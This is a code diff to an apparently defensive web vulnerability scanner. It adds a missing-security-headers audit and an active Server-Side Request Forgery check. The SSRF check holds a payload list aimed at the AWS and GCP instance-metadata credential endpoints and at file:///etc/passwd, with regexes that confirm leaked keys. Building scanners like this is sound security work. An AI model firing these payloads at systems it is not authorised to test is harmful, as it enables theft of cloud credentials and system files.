@@ -619,6 +619,40 @@ _DANGEROUS_METHODS = {"PUT", "DELETE", "TRACE", "CONNECT", "PATCH"}
 _SESSION_COOKIE = re.compile(r"sess|sid|auth|token|jwt|remember|login|sso|csrf", re.I)
 
 
+def _security_headers(ip: str, port: Port, headers: dict) -> list[Vuln]:
+    """Consolidated audit of the root response's security headers. One finding listing
+    every missing header; severity rises when a high-impact one (CSP / clickjacking /
+    HSTS-on-TLS) is absent."""
+    if not headers:
+        return []
+    missing: list[str] = []
+    high = False
+    csp = headers.get("content-security-policy", "")
+    if not csp:
+        missing.append("Content-Security-Policy")
+        high = True
+    if not headers.get("x-frame-options") and "frame-ancestors" not in csp.lower():
+        missing.append("X-Frame-Options / CSP frame-ancestors (clickjacking)")
+        high = True
+    if "nosniff" not in headers.get("x-content-type-options", "").lower():
+        missing.append("X-Content-Type-Options: nosniff")
+    if not headers.get("referrer-policy"):
+        missing.append("Referrer-Policy")
+    if probes._is_tls(port) and not headers.get("strict-transport-security"):
+        missing.append("Strict-Transport-Security (HSTS)")
+        high = True
+    if not headers.get("permissions-policy"):
+        missing.append("Permissions-Policy")
+    if not missing:
+        return []
+    return [_mk(ip, port, "web-security-headers", "medium" if high else "low",
+                "Missing security response headers", ["CWE-693"],
+                "The root response omits: " + "; ".join(missing) + ".",
+                "Set the missing headers: Content-Security-Policy, X-Frame-Options (or CSP "
+                "frame-ancestors), Strict-Transport-Security on TLS, X-Content-Type-Options: "
+                "nosniff, Referrer-Policy, Permissions-Policy.")]
+
+
 def _cookie_findings(ip: str, port: Port, set_cookie_blob: str) -> list[Vuln]:
     """Per-cookie hygiene from the Set-Cookie header(s): HttpOnly, Secure, SameSite,
     __Host-/__Secure- prefix, cleartext-session transport, and over-broad Domain scope.
@@ -1362,6 +1396,49 @@ _FILEISH_PARAM = re.compile(
     re.I)
 
 
+# SSRF: parameters that plausibly carry a URL/host the server will fetch.
+_SSRF_PARAM = re.compile(
+    r"url|uri|link|src|source|dest|target|redirect|feed|image|img|host|domain|callback|"
+    r"webhook|proxy|fetch|remote|load|open|site|endpoint|server|address|api|next|"
+    r"return|continue|to|out|data|resource|path|file|document|view|window|port", re.I)
+# (payload, response-marker, what-it-proves). The metadata/IMDS hits are credential theft.
+_SSRF_PAYLOADS = [
+    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+     re.compile(r"AccessKeyId|SecretAccessKey|\bToken\b|Expiration"),
+     "AWS IAM role credentials via the instance metadata service (IMDSv1)"),
+    ("http://169.254.169.254/latest/meta-data/",
+     re.compile(r"ami-id|instance-id|instance-action|local-ipv4|iam/|placement/|"
+                r"security-credentials"),
+     "AWS instance metadata (IMDSv1)"),
+    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
+     re.compile(r"default/|service-accounts|scopes|email"),
+     "GCP instance metadata (service-account tokens)"),
+    ("file:///etc/passwd", re.compile(r"root:.*:0:0:"),
+     "local file /etc/passwd via the file:// scheme"),
+]
+
+
+def _ssrf_via(ip: str, port: Port, where: str, param: str, send) -> list[Vuln]:
+    """Point a URL-ish parameter at cloud-metadata / file:// and confirm SSRF when the
+    server fetches it and the metadata/file content comes back in the response."""
+    if not _SSRF_PARAM.search(param):
+        return []
+    for payload, marker, what in _SSRF_PAYLOADS:
+        b = _body(send(payload))
+        if b and marker.search(b):
+            cloud = "metadata" in what.lower() or "imds" in what.lower()
+            sev = "critical" if cloud else "high"
+            return [_mk(ip, port, "web-ssrf", sev,
+                        f"Server-Side Request Forgery via {where}", ["CWE-918"],
+                        f"{where} set to {payload!r} caused the server to fetch it and the "
+                        f"response returned {what} - SSRF confirmed (the app requests a "
+                        "URL taken from our input).",
+                        "Allow-list outbound destinations; block link-local/metadata IPs "
+                        "(169.254.169.254); enforce IMDSv2; disable file://.",
+                        confidence="confirmed")]
+    return []
+
+
 def _traversal_via(ip: str, port: Port, where: str, param: str, send) -> list[Vuln]:
     if not _FILEISH_PARAM.search(param):
         return []
@@ -1436,6 +1513,7 @@ def _inject_param(ip, port, where, param, send, sqli, time_based):
         fs += _sqli_via(ip, port, where, send, time_based)
     fs += _open_redirect_via(ip, port, where, send)
     fs += _traversal_via(ip, port, where, param, send)
+    fs += _ssrf_via(ip, port, where, param, send)
     return fs
 
 
@@ -1712,6 +1790,7 @@ def scan_endpoint(ip: str, port: Port, active: bool = True,
                             "Disable automatic directory indexing (Options -Indexes)."))
     # Cookie hardening (per Set-Cookie): HttpOnly / Secure / SameSite / prefix / scope.
     findings.extend(_cookie_findings(ip, port, headers.get("set-cookie", "")))
+    findings.extend(_security_headers(ip, port, headers))
     # Dangerous HTTP methods. When PUT is advertised AND active, we don't just
     # trust the Allow header - we prove it: PUT a marker, GET it back, DELETE it.
     opt = _fetch(ip, port, "/", method="OPTIONS", auth=auth)
